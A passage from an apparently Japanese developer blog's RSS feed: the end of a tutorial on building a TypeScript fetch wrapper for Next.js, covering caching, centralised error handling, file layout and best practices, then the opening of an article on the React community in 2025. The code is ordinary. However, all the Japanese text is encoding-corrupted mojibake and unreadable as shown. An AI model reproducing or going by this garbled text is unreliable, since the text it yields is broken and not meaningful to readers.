    <span class="token keyword">this</span><span class="token punctuation">.</span>pendingRequests<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">,</span> requestPromise<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> requestPromise<span class="token punctuation">;</span>

      <span class="token comment">// æˆåŠŸã—ãŸãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’ã‚­ãƒ£ãƒƒã‚·ãƒ¥</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token operator">?.</span>cache <span class="token operator">&amp;&amp;</span> response<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">,</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> response<span class="token punctuation">.</span>data<span class="token punctuation">,</span> timestamp<span class="token operator">:</span> now <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">return</span> response<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>pendingRequests<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°æˆ¦ç•¥</h2>
<p>ã“ã®ãƒ©ãƒƒãƒ‘ãƒ¼ã®æœ€å¤§ã®åˆ©ç‚¹ã®ä¸€ã¤ã¯ã€ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã‚’ä¸€å…ƒåŒ–ã§ãã‚‹ã“ã¨ã§ã™ã€‚ä»¥ä¸‹ã«ãã®æ´»ç”¨æ–¹æ³•ã‚’ç¤ºã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// lib/error-handler.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ApiError <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./api'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">handleApiError</span><span class="token punctuation">(</span>error<span class="token operator">:</span> <span class="token builtin">unknown</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>error <span class="token keyword">instanceof</span> <span class="token class-name">ApiError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>error<span class="token punctuation">.</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token number">401</span><span class="token operator">:</span>
        <span class="token comment">// ãƒ­ã‚°ã‚¤ãƒ³ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã™ã‚‹ã‹ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ›´æ–°</span>
        <span class="token keyword">return</span> <span class="token string">'ç¶šè¡Œã™ã‚‹ã«ã¯ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ãã ã•ã„'</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">403</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'ã“ã®æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹æ¨©é™ãŒã‚ã‚Šã¾ã›ã‚“'</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">404</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'è¦æ±‚ã•ã‚ŒãŸãƒªã‚½ãƒ¼ã‚¹ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã§ã—ãŸ'</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">500</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'ã‚µãƒ¼ãƒãƒ¼ã‚¨ãƒ©ãƒ¼ã§ã™ã€‚å¾Œã§ã‚‚ã†ä¸€åº¦ãŠè©¦ã—ãã ã•ã„'</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token keyword">return</span> error<span class="token punctuation">.</span>message<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token string">'äºˆæœŸã—ãªã„ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¾ã—ãŸ'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã®ä½¿ç”¨ä¾‹</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> handleApiError <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@/lib/error-handler'</span><span class="token punctuation">;</span>

<span class="token keyword">try</span> <span class="token punctuation">{</span>
  <span class="token keyword">await</span> api<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/protected-resource'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> errorMessage <span class="token operator">=</span> <span class="token function">handleApiError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
  toast<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>errorMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>ãƒ•ã‚¡ã‚¤ãƒ«æ§‹é€ ã¨æ•´ç†</h2>
<p>APIãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’æ•´ç†ã™ã‚‹ãŸã‚ã€ä»¥ä¸‹ã®ã‚ˆã†ãªãƒ•ã‚¡ã‚¤ãƒ«æ§‹é€ ã‚’ãŠå‹§ã‚ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">lib/
â”œâ”€â”€ api/
â”‚   â”œâ”€â”€ index.ts          # ãƒ¡ã‚¤ãƒ³ã®APIã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ
â”‚   â”œâ”€â”€ types.ts          # TypeScriptã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹
â”‚   â”œâ”€â”€ endpoints.ts      # ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®å®šç¾©
â”‚   â””â”€â”€ error-handler.ts  # ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£
â”œâ”€â”€ hooks/
â”‚   â”œâ”€â”€ useApi.ts         # ã‚«ã‚¹ã‚¿ãƒ Reactãƒ•ãƒƒã‚¯
â”‚   â””â”€â”€ useAuth.ts        # èªè¨¼ãƒ•ãƒƒã‚¯
â””â”€â”€ utils/
    â””â”€â”€ api-helpers.ts    # ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£é–¢æ•°</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®æ§‹é€ ã«ã‚ˆã‚Šã€APIãƒ¬ã‚¤ãƒ¤ãƒ¼ãŒæ•´ç†ã•ã‚Œã€ãƒãƒ¼ãƒ ãƒ¡ãƒ³ãƒãƒ¼ãŒå¿…è¦ãªã‚‚ã®ã‚’ç°¡å˜ã«è¦‹ã¤ã‘ã‚‰ã‚Œã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<h2>ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã¨ã‚ˆãã‚ã‚‹è½ã¨ã—ç©´</h2>
<h3>æ¨å¥¨äº‹é …ï¼š</h3>
<ul>
<li><strong>å¸¸ã«ã‚¨ãƒ©ãƒ¼ã‚’æ˜ç¤ºçš„ã«å‡¦ç†ã™ã‚‹</strong> - æ•æ‰ã•ã‚Œãªã„ã¾ã¾æ”¾ç½®ã—ãªã„</li>
<li>ãƒªã‚¯ã‚¨ã‚¹ãƒˆ/ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®å½¢çŠ¶ã«<strong>TypeScriptã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹</strong></li>
<li>ç•°ãªã‚‹ç’°å¢ƒã‚„ã‚µãƒ¼ãƒ“ã‚¹ã”ã¨ã«<strong>åˆ¥ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ä½œæˆã™ã‚‹</strong></li>
<li>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«<strong>é©åˆ‡ãªãƒ­ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°çŠ¶æ…‹ã‚’å®Ÿè£…ã™ã‚‹</strong></li>
<li>ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ¸›ã‚‰ã™ãŸã‚ã€å¿…è¦ã«å¿œã˜ã¦<strong>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã™ã‚‹</strong></li>
</ul>
<h3>éæ¨å¥¨äº‹é …ï¼š</h3>
<ul>
<li>æœ¬ç•ªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§<strong>æ©Ÿå¯†æ€§ã®é«˜ã„ãƒˆãƒ¼ã‚¯ãƒ³ã‚’localStorageã«ä¿å­˜ã—ãªã„</strong>ï¼ˆhttpOnly Cookieã‚’ä½¿ç”¨ã™ã‚‹ï¼‰</li>
<li><strong>HTTPã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’ç„¡è¦–ã—ãªã„</strong> - ç•°ãªã‚‹ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’é©åˆ‡ã«å‡¦ç†ã™ã‚‹</li>
<li><strong>ãƒ¬ãƒ³ãƒ€ãƒ¼ãƒ¡ã‚½ãƒƒãƒ‰ã§APIã‚³ãƒ¼ãƒ«ã‚’è¡Œã‚ãªã„</strong> - useEffectã¾ãŸã¯ã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ä½¿ç”¨ã™ã‚‹</li>
<li><strong>ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã‚’å¿˜ã‚Œãªã„</strong> - ãƒãƒ³ã‚°ã™ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é˜²ã</li>
<li><strong>URLã‚’ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã—ãªã„</strong> - ç’°å¢ƒå¤‰æ•°ã‚’ä½¿ç”¨ã™ã‚‹</li>
</ul>
<h3>ã‚ˆãã‚ã‚‹è½ã¨ã—ç©´ï¼š</h3>
<ol>
<li><strong>ã€Œç§ã®ãƒã‚·ãƒ³ã§ã¯å‹•ãã®ã«ã€ã¨ã„ã†ç½ </strong>: å¸¸ã«ç•°ãªã‚‹Next.jsã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆï¼ˆã‚µãƒ¼ãƒãƒ¼ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã€APIãƒ«ãƒ¼ãƒˆï¼‰ã§ãƒ†ã‚¹ãƒˆã™ã‚‹ã€‚</li>
<li><strong>ãƒˆãƒ¼ã‚¯ãƒ³æ›´æ–°åœ°ç„</strong>: å¿…è¦ã«ãªã‚‹å‰ã«ã€é©åˆ‡ãªãƒˆãƒ¼ã‚¯ãƒ³æ›´æ–°ãƒ­ã‚¸ãƒƒã‚¯ã‚’å®Ÿè£…ã™ã‚‹ã€‚</li>
<li><strong>ã‚¨ãƒ©ãƒ¼ãƒã‚¦ãƒ³ãƒ€ãƒªã®è»½è¦–</strong>: APIã‚’åˆ©ç”¨ã™ã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã‚¨ãƒ©ãƒ¼ãƒã‚¦ãƒ³ãƒ€ãƒªã§ãƒ©ãƒƒãƒ—ã™ã‚‹ã€‚</li>
</ol>
<h2>å¤§å±€çš„ã«è¦‹ã‚‹ï¼šãªãœã“ã‚ŒãŒé‡è¦ãªã®ã‹</h2>
<p>å …ç‰¢ãªfetchãƒ©ãƒƒãƒ‘ãƒ¼ã‚’æ§‹ç¯‰ã™ã‚‹ã“ã¨ã¯ã€å˜ã«ã‚³ãƒ¼ãƒ‰ã‚’ã‚¯ãƒªãƒ¼ãƒ³ã«ã™ã‚‹ã“ã¨ã ã‘ãŒç›®çš„ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãŸã‚ã®<strong>ä¿¡é ¼æ€§ã®é«˜ã„åŸºç›¤</strong>ã‚’ç¯‰ãã“ã¨ãŒé‡è¦ã§ã™ã€‚APIãƒ¬ã‚¤ãƒ¤ãƒ¼ãŒã—ã£ã‹ã‚Šã—ã¦ã„ã‚‹ã¨ã€ä»¥ä¸‹ã®ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚</p>
<ul>
<li>ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å•é¡Œã®ãƒ‡ãƒãƒƒã‚°ã§ã¯ãªãã€<strong>æ©Ÿèƒ½é–‹ç™ºã«é›†ä¸­ã§ãã‚‹</strong></li>
<li>ãƒªã‚¯ã‚¨ã‚¹ãƒˆå‡¦ç†ã®ä¸€è²«æ€§ãŒä¿ãŸã‚Œã¦ã„ã‚‹ãŸã‚ã€<strong>è‡ªä¿¡ã‚’æŒã£ã¦ã‚¹ã‚±ãƒ¼ãƒ«ã§ãã‚‹</strong></li>
<li>æ˜ç¢ºã§æ–‡æ›¸åŒ–ã•ã‚ŒãŸAPIã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã«ã‚ˆã‚Šã€<strong>æ–°ã—ã„é–‹ç™ºè€…ã®ã‚ªãƒ³ãƒœãƒ¼ãƒ‡ã‚£ãƒ³ã‚°</strong>ãŒè¿…é€Ÿã«ãªã‚‹</li>
<li>ä¸€å…ƒåŒ–ã•ã‚ŒãŸã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã¨å‹ä»˜ã‘ã«ã‚ˆã‚Šã€<strong>ã‚ˆã‚Šè‰¯ã„ã‚³ãƒ¼ãƒ‰å“è³ªã‚’ç¶­æŒã§ãã‚‹</strong></li>
</ul>
<p>ã“ã‚Œã¯æœªæ¥ã®è‡ªåˆ†ã¸ã®æŠ•è³‡ã ã¨è€ƒãˆã¦ãã ã•ã„ã€‚ã“ã®ãƒ©ãƒƒãƒ‘ãƒ¼ã®æ§‹ç¯‰ã«è²»ã‚„ã™1æ™‚é–“ã¯ã€æœ¬ç•ªç’°å¢ƒã®å•é¡Œã‚’ãƒ‡ãƒãƒƒã‚°ã—ãŸã‚Šã€åå¾©çš„ãªã‚¨ãƒ©ãƒ¼å‡¦ç†ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ã„ãŸã‚Šã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯é–¢é€£ã®ãƒã‚°ã‚’æ¢ã—ãŸã‚Šã™ã‚‹ä½•åæ™‚é–“ã‚‚ã®æ™‚é–“ã‚’ç¯€ç´„ã—ã¦ãã‚Œã‚‹ã§ã—ã‚‡ã†ã€‚</p>
<h2>çµè«–ï¼šAPIãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’ç«¶äº‰ä¸Šã®å„ªä½æ€§ã¨ã—ã¦</h2>
<p>ç§ãŸã¡ã¯ã€ç´ ã®<code class="language-text">fetch</code>ã‚³ãƒ¼ãƒ«ã®è³ªç´ ãªå§‹ã¾ã‚Šã‹ã‚‰ã€èªè¨¼ã€ã‚¨ãƒ©ãƒ¼ã€TypeScriptã®å®‰å…¨æ€§ã€ãã—ã¦Next.jsç‰¹æœ‰ã®å®Ÿè¡Œã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’å‡¦ç†ã™ã‚‹ã€æ´—ç·´ã•ã‚ŒãŸæœ¬ç•ªç’°å¢ƒå¯¾å¿œã®APIã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¸ã¨æ—…ã‚’ã—ã¦ãã¾ã—ãŸã€‚ã—ã‹ã—ã€é‡è¦ãªã®ã¯ã€ã“ã‚Œã¯å˜ã«ã‚ˆã‚Šè‰¯ã„ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ãã“ã¨ã ã‘ã§ã¯ãªã„ã¨ã„ã†ã“ã¨ã§ã™ã€‚
ä»Šæ—¥ã®é–‹ç™ºç’°å¢ƒã«ãŠã„ã¦ã€APIãƒ¬ã‚¤ãƒ¤ãƒ¼ã®å“è³ªã¯ã€ãƒãƒ¼ãƒ ã®é–‹ç™ºé€Ÿåº¦ã¨ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ä¿¡é ¼æ€§ã«ç›´æ¥å½±éŸ¿ã—ã¾ã™ã€‚å·§ã¿ã«ä½œã‚‰ã‚ŒãŸfetchãƒ©ãƒƒãƒ‘ãƒ¼ã¯ã€ãƒãƒ¼ãƒ ãŒè¿…é€Ÿã«å‹•ãã€è‡ªä¿¡ã‚’æŒã£ã¦è£½å“ã‚’å±Šã‘ã‚‰ã‚Œã‚‹ã‚ˆã†ã«ã™ã‚‹ã€ç›®ã«è¦‹ãˆãªã„ã‚¤ãƒ³ãƒ•ãƒ©ã¨ãªã‚‹ã®ã§ã™ã€‚
ç§ãŸã¡ãŒæ¢æ±‚ã—ã¦ããŸãƒ‘ã‚¿ãƒ¼ãƒ³ï¼ˆã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆèªè­˜ã€é©åˆ‡ãªã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã€TypeScriptã®çµ±åˆã€ãã—ã¦è€ƒãˆæŠœã‹ã‚ŒãŸã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ï¼‰ã¯ã€å˜ãªã‚‹ã€Œã‚ã‚Œã°è‰¯ã„ã‚‚ã®ã€ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãã‚Œã‚‰ã¯ã€æœ¬ç•ªç’°å¢ƒã§å£Šã‚Œã‚„ã™ã„è„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã€ç¾å®Ÿä¸–ç•Œã®äº‹è±¡ã‚’é©åˆ‡ã«å‡¦ç†ã™ã‚‹å …ç‰¢ãªã‚·ã‚¹ãƒ†ãƒ ã®åˆ†ã‹ã‚Œç›®ã¨ãªã‚‹ã®ã§ã™ã€‚</p>]]></content:encoded></item><item><title><![CDATA[2025å¹´ã®Reactã¨ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ç¾çŠ¶]]></title><description><![CDATA[ReactãŒã“ã‚Œã¾ã§ã©ã®ã‚ˆã†ã«é–‹ç™ºã•ã‚Œã¦ããŸã‹ã«ã¤ã„ã¦ã®è©³ç´°ãªè€ƒå¯Ÿã¨ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã§ã‚ˆãè¦‹ã‚‰ã‚Œã‚‹æ··ä¹±ã‚„æ‡¸å¿µäº‹é …ã«ã¤ã„ã¦ã®èª¬æ˜ ã¯ã˜ã‚ã« ä»Šæ—¥ã€Reactã¨ãã®ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®çŠ¶æ³ã¯è¤‡é›‘ã§åˆ†è£‚ã—ã¦ãŠã‚Šã€â€¦]]></description><link>https://postd.cc/react-community-2025/</link><guid isPermaLink="false">https://postd.cc/react-community-2025/</guid><category><![CDATA[é–‹ç™ºæ‰‹æ³•ãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç®¡ç†]]></category><category><![CDATA[React]]></category><category><![CDATA[OSS]]></category><category><![CDATA[ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹]]></category><pubDate>Thu, 28 Aug 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>ReactãŒã“ã‚Œã¾ã§ã©ã®ã‚ˆã†ã«é–‹ç™ºã•ã‚Œã¦ããŸã‹ã«ã¤ã„ã¦ã®è©³ç´°ãªè€ƒå¯Ÿã¨ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã§ã‚ˆãè¦‹ã‚‰ã‚Œã‚‹æ··ä¹±ã‚„æ‡¸å¿µäº‹é …ã«ã¤ã„ã¦ã®èª¬æ˜</p>
<h2>ã¯ã˜ã‚ã«</h2>
<p>ä»Šæ—¥ã€Reactã¨ãã®ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®çŠ¶æ³ã¯è¤‡é›‘ã§åˆ†è£‚ã—ã¦ãŠã‚Šã€æˆåŠŸã€æ‡ç–‘ã€ãã—ã¦è«–äº‰ãŒå…¥ã‚Šæ··ã˜ã£ã¦ã„ã¾ã™ã€‚</p>
<p>ãƒã‚¸ãƒ†ã‚£ãƒ–ãªé¢ã¨ã—ã¦ã€Reactã¯æœ€ã‚‚åºƒãåˆ©ç”¨ã•ã‚Œã¦ã„ã‚‹UIãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã‚ã‚Šã€ãã®ã‚³ãƒ³ã‚»ãƒ—ãƒˆã¯JSã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®ä»–ã®éƒ¨åˆ†ã«ã‚‚å½±éŸ¿ã‚’ä¸ãˆã¦ãã¾ã—ãŸã€‚Reactãƒãƒ¼ãƒ ã¯æ•°å¹´ã«ã‚ãŸã‚‹é–‹ç™ºã®æœ«ã€å…ˆæ—¥React 19ã‚’ãƒªãƒªãƒ¼ã‚¹ã—ã¾ã—ãŸã€‚ã“ã‚Œã¯ã€å…¬å¼ã«å®‰å®šç‰ˆã¨ãªã£ãŸReact Server Componentsã®ã‚µãƒãƒ¼ãƒˆã€Promiseã‚’æ‰±ã†ãŸã‚ã®æ–°ã—ã„<code class="language-text">use</code>ãƒ•ãƒƒã‚¯ã€è¤‡æ•°ã®æ–°ã—ã„ãƒ•ã‚©ãƒ¼ãƒ é€£æºã€ãã—ã¦é•·ã‚‰ãéæ¨å¥¨ã§ã‚ã£ãŸå¤šãã®æ™‚ä»£é…ã‚Œãªæ©Ÿèƒ½ã®å‰Šé™¤ã‚’å«ã‚€ã€å¤§è¦æ¨¡ãªãƒªãƒªãƒ¼ã‚¹ã§ã—ãŸã€‚</p>
<p>ã—ã‹ã—ã€ç§ãŒè¦³å¯Ÿã—ã€ã¾ãŸçµŒé¨“ã—ã¦ããŸã¨ã“ã‚ã§ã¯ã€Reactã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã§ã¯ã€Reactã®å‘ã‹ã†å…ˆã‚„ãã®é–‹ç™ºæ–¹æ³•ã€æ¨å¥¨ã•ã‚Œã‚‹åˆ©ç”¨ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã€ãã—ã¦Reactãƒãƒ¼ãƒ ã¨ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£é–“ã®ç›¸äº’ä½œç”¨ã«ã¤ã„ã¦ã€ãŸãã•ã‚“ã®æ„è¦‹ãŒäº¤ã‚ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€éå»æ•°å¹´é–“ã«ã‚ãŸã£ã¦ReactãŠã‚ˆã³Webé–‹ç™ºã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£å…¨ä½“ã§é£›ã³äº¤ã£ã¦ããŸä½•åã‚‚ã®ç•°ãªã‚‹è­°è«–ã‚„ã€Reactã®å‹•ä½œã«é–¢ã™ã‚‹ç‰¹å®šã®æŠ€è¡“çš„æ‡¸å¿µã€ä»–ã®é¡ä¼¼JSãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¨ã®æ¯”è¼ƒã€ãã—ã¦ä»Šå¾ŒWebã‚¢ãƒ—ãƒªã‚’ã©ã®ã‚ˆã†ã«æ§‹ç¯‰ã™ã¹ãã‹ã¨ã„ã£ãŸå•é¡Œã¨é‡ãªã£ã¦ã„ã¾ã™ã€‚</p>
<p>äº‹æ…‹ã‚’ã•ã‚‰ã«æ‚ªåŒ–ã•ã›ã¦ã„ã‚‹ã®ã¯ã€èª°ã‚‚ãŒã“ã‚Œã‚‰ã®æ‡¸å¿µã®ç•°ãªã‚‹ä¸€éƒ¨åˆ†ã«ã¤ã„ã¦è­°è«–ã‚„è¨è«–ã‚’ã—ã¦ãŠã‚Šã€è¡¨æ˜ã•ã‚Œã¦ã„ã‚‹æ‡¸å¿µã®å¤šããŒèª¤ã‚Šã§ã‚ã‚‹ã‹ã€å®Œå…¨ãªFUD<em>ã§ã‚ã‚‹ã“ã¨ã§ã™ã€‚æ®‹å¿µãªãŒã‚‰ã€ã“ã‚Œã‚‰ã®è­°è«–ã¨ææ€–ã¯ã€Reactãƒãƒ¼ãƒ ã¨é–‹ç™ºè€…é–“ã®é©åˆ‡ãªã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ä¸è¶³ãªã©ã«ã‚ˆã£ã¦ã€ã•ã‚‰ã«è¤‡é›‘åŒ–ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰å…¨ã¦ãŒå¯†æ¥ã«çµ¡ã¿åˆã£ã¦ã„ã‚‹ã®ã§ã™ã€‚
</em>ä¸å®‰ã‚„æ‡¸å¿µã€ä¸é€æ˜æ„Ÿ</p>
<p>ç§ã¯ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒ¡ãƒ‡ã‚£ã‚¢ä¸Šã§é–¢é€£ã™ã‚‹å¤šãã®è­°è«–ã«å‚åŠ ã—ã¦ãã¾ã—ãŸã€‚Reactãƒãƒ¼ãƒ ã‚’æ“è­·ã—ã€ã¾ãŸæ‰¹åˆ¤ã™ã‚‹ã‚³ãƒ¡ãƒ³ãƒˆã‚’æ•°å¤šãæ›¸ãã€å½¼ã‚‰ãŒç‰¹å®šã®æ±ºå®šã‚’ä¸‹ã—ãŸç†ç”±ã‚„ç‰©äº‹ã®å®Ÿéš›ã®çµŒç·¯ã‚’èª¬æ˜ã—ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚„èª¬æ˜ã®æ”¹å–„ã‚’æ±‚ã‚ã€ãã®ä»–å¤šãã®æ´»å‹•ã‚’è¡Œã£ã¦ãã¾ã—ãŸã€‚
